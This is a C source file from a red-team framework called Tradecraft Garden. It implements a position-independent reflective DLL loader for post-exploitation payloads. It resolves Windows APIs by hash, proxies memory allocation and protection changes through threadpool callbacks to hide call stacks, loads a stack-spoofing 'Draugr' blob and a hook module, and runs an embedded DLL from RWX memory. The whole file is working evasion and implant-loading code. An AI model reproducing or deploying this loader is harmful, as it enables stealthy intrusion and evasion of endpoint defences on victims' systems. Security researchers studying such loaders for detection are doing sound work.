/*
 * Copyright (C) 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * This file is part of Tradecraft Garden
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License along
 *  with this program; if not, see <https://www.gnu.org/licenses/>.
 */

void setupProxy(void * loaderArgument);

__attribute__((noinline, no_reorder)) void go(void * loaderArgument) {
	setupProxy(loaderArgument);
}

#include "loaderdefs.h"
#include "loader.h"
#include "picorun.h"
#include "hash.h"
#include "resolve_eat.h"
#include "proxy.h"

#define memset(x, y, z) __stosb((unsigned char *)x, y, z);
#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);

#define DLL_POSTEX_START 0x4

#define WIN32_FUNC( x ) __typeof__( x ) * x

typedef struct {
	WIN32_FUNC(LoadLibraryA);
	WIN32_FUNC(GetProcAddress);
	DRAUGR Draugr;
	WIN32_FUNC(RtlLookupFunctionEntry);
	WIN32_FUNC(GetModuleHandleA);
	WIN32_FUNC(VirtualAlloc);
	WIN32_FUNC(VirtualAllocEx);
	WIN32_FUNC(VirtualProtect);
	WIN32_FUNC(VirtualProtectEx);
	WIN32_FUNC(VirtualFree);
	WIN32_FUNC(GetThreadContext);
	WIN32_FUNC(SetThreadContext);
	WIN32_FUNC(ResumeThread);
	WIN32_FUNC(CreateThread);
	WIN32_FUNC(CreateRemoteThread);
	WIN32_FUNC(OpenProcess);
	WIN32_FUNC(OpenThread);
	WIN32_FUNC(CloseHandle);
	WIN32_FUNC(CreateFileMappingA);
	WIN32_FUNC(MapViewOfFile);
	WIN32_FUNC(UnmapViewOfFile);
	WIN32_FUNC(VirtualQuery);
	WIN32_FUNC(DuplicateHandle);
	WIN32_FUNC(ReadProcessMemory);
	WIN32_FUNC(WriteProcessMemory);
	WIN32_FUNC(ExitThread);
	WIN32_FUNC(CreateProcessA);
	WIN32_FUNC(Sleep);

	TPALLOCWORK   TpAllocWork;
	TPPOSTWORK    TpPostWork;
	TPRELEASEWORK TpReleaseWork;
	void *        NtAllocateVirtualMemory;
	void *        NtProtectVirtualMemory;
} WIN32FUNCS;

void findNeededFunctions(WIN32FUNCS * funcs)
{
	char * kernel32 = (char *)findModuleByHash(KERNEL32DLL_HASH);
	char * ntdll    = (char *)findModuleByHash(NTDLLDLL_HASH);

	funcs->LoadLibraryA           = (__typeof__(LoadLibraryA)           *) findFunctionByHash(kernel32, LOADLIBRARYA_HASH);
	funcs->GetProcAddress         = (__typeof__(GetProcAddress)         *) findFunctionByHash(kernel32, GETPROCADDRESS_HASH);
	funcs->RtlLookupFunctionEntry = (__typeof__(RtlLookupFunctionEntry) *) findFunctionByHash(kernel32, RTLLOOKUPFUNCTIONENTRY_HASH);
 	funcs->GetModuleHandleA       = (__typeof__(GetModuleHandleA)       *) findFunctionByHash(kernel32, GETMODULEHANDLEA_HASH);
	funcs->VirtualAlloc           = (__typeof__(VirtualAlloc)           *) findFunctionByHash(kernel32, VIRTUALALLOC_HASH);
	funcs->VirtualAllocEx         = (__typeof__(VirtualAllocEx)         *) findFunctionByHash(kernel32, VIRTUALALLOCEX_HASH);
	funcs->VirtualProtect         = (__typeof__(VirtualProtect)         *) findFunctionByHash(kernel32, VIRTUALPROTECT_HASH);
	funcs->VirtualProtectEx       = (__typeof__(VirtualProtectEx)       *) findFunctionByHash(kernel32, VIRTUALPROTECTEX_HASH);
	funcs->VirtualFree            = (__typeof__(VirtualFree)            *) findFunctionByHash(kernel32, VIRTUALFREE_HASH);
	funcs->GetThreadContext       = (__typeof__(GetThreadContext)       *) findFunctionByHash(kernel32, GETTHREADCONTEXT_HASH);
	funcs->SetThreadContext       = (__typeof__(SetThreadContext)       *) findFunctionByHash(kernel32, SETTHREADCONTEXT_HASH);
	funcs->ResumeThread           = (__typeof__(ResumeThread)           *) findFunctionByHash(kernel32, RESUMETHREAD_HASH);
	funcs->CreateThread           = (__typeof__(CreateThread)           *) findFunctionByHash(kernel32, CREATETHREAD_HASH);
	funcs->CreateRemoteThread     = (__typeof__(CreateRemoteThread)     *) findFunctionByHash(kernel32, CREATEREMOTETHREAD_HASH);
	funcs->OpenProcess            = (__typeof__(OpenProcess)            *) findFunctionByHash(kernel32, OPENPROCESS_HASH);
	funcs->OpenThread             = (__typeof__(OpenThread)             *) findFunctionByHash(kernel32, CREATEREMOTETHREAD_HASH);
	funcs->CloseHandle            = (__typeof__(CloseHandle)            *) findFunctionByHash(kernel32, CLOSEHANDLE_HASH);
	funcs->CreateFileMappingA     = (__typeof__(CreateFileMappingA)     *) findFunctionByHash(kernel32, CREATEFILEMAPPINGA_HASH);
	funcs->MapViewOfFile          = (__typeof__(MapViewOfFile)          *) findFunctionByHash(kernel32, MAPVIEWOFFILE_HASH);
	funcs->UnmapViewOfFile        = (__typeof__(UnmapViewOfFile)        *) findFunctionByHash(kernel32, UNMAPVIEWOFFILE_HASH);
	funcs->VirtualQuery           = (__typeof__(VirtualQuery)           *) findFunctionByHash(kernel32, VIRTUALQUERY_HASH);
	funcs->DuplicateHandle        = (__typeof__(DuplicateHandle)        *) findFunctionByHash(kernel32, DUPLICATEHANDLE_HASH);
	funcs->ReadProcessMemory      = (__typeof__(ReadProcessMemory)      *) findFunctionByHash(kernel32, READPROCESSMEMORY_HASH);
	funcs->WriteProcessMemory     = (__typeof__(WriteProcessMemory)     *) findFunctionByHash(kernel32, WRITEPROCESSMEMORY_HASH);
	funcs->ExitThread             = (__typeof__(ExitThread)             *) findFunctionByHash(kernel32, EXITTHREAD_HASH);
	funcs->CreateProcessA         = (__typeof__(CreateProcessA)         *) findFunctionByHash(kernel32, CREATEPROCESSA_HASH);
	funcs->Sleep                  = (__typeof__(Sleep)                  *) findFunctionByHash(kernel32, SLEEP_HASH);

	funcs->TpAllocWork             = (TPALLOCWORK)   findFunctionByHash(ntdll, TPALLOCWORK_HASH);
	funcs->TpPostWork              = (TPPOSTWORK)    findFunctionByHash(ntdll, TPPOSTWORK_HASH);
	funcs->TpReleaseWork           = (TPRELEASEWORK) findFunctionByHash(ntdll, TPRELEASEWORK_HASH);
	funcs->NtAllocateVirtualMemory = (void *)        findFunctionByHash(ntdll, NTALLOCATEVIRTUALMEMORY_HASH);
	funcs->NtProtectVirtualMemory  = (void *)        findFunctionByHash(ntdll, NTPROTECTVIRTUALMEMORY_HASH);
}

#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#define GETRESOURCE(x) PTR_OFFSET(caller(), (ULONG_PTR)x + 5)
#else
#define GETRESOURCE(x) (char *)&x
#endif

typedef struct {
    int   length;
    char  value[];
} RESOURCE;

char __DLLDATA__[0] __attribute__((section("my_data")));
char __PICDATA__[0] __attribute__((section("my_proxy")));
char __HOKDATA__[0] __attribute__((section("my_hooks")));

typedef void (*PICOHOOK_ENTRY)(IMPORTFUNCS * funcs, char * dllbase, DWORD dllsz);

char * loader_start() {
#ifdef WIN_X86
	return PTR_OFFSET(caller(), (ULONG_PTR)go + 5);
#else
	return (char *)go;
#endif
}

typedef struct {
	char draugrpic[4096];
	char hookdata[4096];
	char hookcode[12288];
	char dllbase[0];
} LAYOUT;

void __attribute__((naked)) workCallback()
{
    __asm__ __volatile__ (
		".intel_syntax noprefix;"
		"mov rbx, rdx;"           // move struct as we're going to stomp rdx
    	
		"mov rax, [rbx];"         // function pointer
    	"mov rcx, [rbx + 0x8];"   // argument 1
    	"mov rdx, [rbx + 0x10];"  // argument 2
    	"mov r8,  [rbx + 0x18];"  // argument 3
		"mov r9,  [rbx + 0x20];"  // argument 4
		
		"mov r10, [rbx + 0x30];"  // argument 6
    	"mov [rsp + 0x30], r10;"
    	
		"mov r10, [rbx + 0x28];"  // argument 5
    	"mov [rsp + 0x28], r10;"
    	
		"jmp rax;"               // jump
		".att_syntax prefix;"
	);
}

void * allocate_memory_threadpool(SIZE_T size, ULONG protect, WIN32FUNCS * funcs)
{
	NTARGS args;
	memset(&args, 0, sizeof(NTARGS));

	void * baseAddress = NULL;

	args.function  = (ULONG_PTR)(funcs->NtAllocateVirtualMemory);
	args.argument1 = (ULONG_PTR)(HANDLE)(-1);
	args.argument2 = (ULONG_PTR)(&baseAddress);
	args.argument3 = (ULONG_PTR)(0);
	args.argument4 = (ULONG_PTR)(&size);
	args.argument5 = (ULONG_PTR)(MEM_COMMIT|MEM_RESERVE);
	args.argument6 = (ULONG_PTR)(protect);

	PTP_WORK WorkReturn = NULL;

    funcs->TpAllocWork(&WorkReturn, (PTP_WORK_CALLBACK)workCallback, &args, NULL);
    funcs->TpPostWork(WorkReturn);
    funcs->TpReleaseWork(WorkReturn);

	funcs->Sleep(100);

	return baseAddress;
}

void protect_memory_threadpool(void * baseAddress, SIZE_T size, ULONG newProtect, WIN32FUNCS * funcs)
{
	NTARGS args;
	memset(&args, 0, sizeof(NTARGS));

	ULONG oldProtect = 0;

	args.function  = (ULONG_PTR)(funcs->NtProtectVirtualMemory);
	args.argument1 = (ULONG_PTR)(HANDLE)(-1);
	args.argument2 = (ULONG_PTR)(&baseAddress);
	args.argument3 = (ULONG_PTR)(&size);
	args.argument4 = (ULONG_PTR)(newProtect);
	args.argument5 = (ULONG_PTR)(&oldProtect);

	PTP_WORK WorkReturn = NULL;

    funcs->TpAllocWork(&WorkReturn, (PTP_WORK_CALLBACK)workCallback, &args, NULL);
    funcs->TpPostWork(WorkReturn);
    funcs->TpReleaseWork(WorkReturn);

	funcs->Sleep(100);
}

#ifdef DEBUG
#include "debug.h"
#endif

void reflectiveLoader(WIN32FUNCS * funcs, LAYOUT * layout, char * dll, DLLDATA * dllData, LPVOID loaderArgument)
{
	char * hooks;

	/* Time to load the hook PICO */
	hooks = GETRESOURCE(__HOKDATA__);

	#ifdef DEBUG
	PIC_STRING(picosz, "[POSTEX] HookPicoDataSize: %d\nHookPicoCodeSize: %d\n");
	dprintf((IMPORTFUNCS *)funcs, picosz, PicoDataSize(hooks), PicoCodeSize(hooks));
	#endif

	/* Load it into the layout */
	PicoLoad((IMPORTFUNCS *)funcs, hooks, layout->hookcode, layout->hookdata);

	/* Make the code section RX */
	protect_memory_threadpool(layout->hookcode, PicoCodeSize(hooks), PAGE_EXECUTE_READ, funcs);

	/* Call its entry point */
	((PICOHOOK_ENTRY)PicoEntryPoint(hooks, layout->hookcode))((IMPORTFUNCS *)funcs, layout->dllbase, SizeOfDLL(dllData));

	/* Now load the DLL */
	LoadDLL(dllData, dll, layout->dllbase);
	ProcessImports((IMPORTFUNCS *)funcs, dllData, layout->dllbase);

	/* Get its entry point */
	DLLMAIN_FUNC entryPoint = EntryPoint(dllData, layout->dllbase);

	/* yolo this RWX for now */
	protect_memory_threadpool(layout->dllbase, SizeOfDLL(dllData), PAGE_EXECUTE_READWRITE, funcs);

	/* Call it twice */
	entryPoint((HINSTANCE)layout->dllbase, DLL_PROCESS_ATTACH, NULL);
	entryPoint((HINSTANCE)loader_start(), DLL_POSTEX_START, loaderArgument);
}

void setupProxy(LPVOID loaderArgument)
{
	WIN32FUNCS   funcs;
	char       * dll;
	DLLDATA      dllData;
	LAYOUT     * layout;
	RESOURCE   * pic;

	/* Resolve functions */
	findNeededFunctions(&funcs);

	/* Grab the DLL because we need its size */
	dll = GETRESOURCE(__DLLDATA__);

	/* Parse the headers */
	ParseDLL(dll, &dllData);

	/* Allocate memory for everything we'll load */
	layout = (LAYOUT *)allocate_memory_threadpool(sizeof(LAYOUT) + SizeOfDLL(&dllData), PAGE_READWRITE, &funcs);

	#ifdef DEBUG
	PIC_STRING(mem, "[POSTEX] draugrpic @ 0x%lp\nhookdata @ 0x%lp\nhookcode @ 0x%lp\ndllbase @ 0x%lp\n");
	dprintf((IMPORTFUNCS *)&funcs, mem, layout->draugrpic, layout->hookdata, layout->hookcode, layout->dllbase);
	#endif

	/* Grab the Draugr PIC */
	pic = (RESOURCE *)GETRESOURCE(__PICDATA__);

	/* Copy it into memory */
	memcpy(layout->draugrpic, pic->value, pic->length);

	/* Flip memory to RX */
	protect_memory_threadpool(layout->draugrpic, pic->length, PAGE_EXECUTE_READ, &funcs);

	/* Set funcs field */
	funcs.Draugr = (DRAUGR)(layout->draugrpic);

	/* Carry on loading the rest */
	reflectiveLoader(&funcs, layout, dll, &dllData, loaderArgument);
}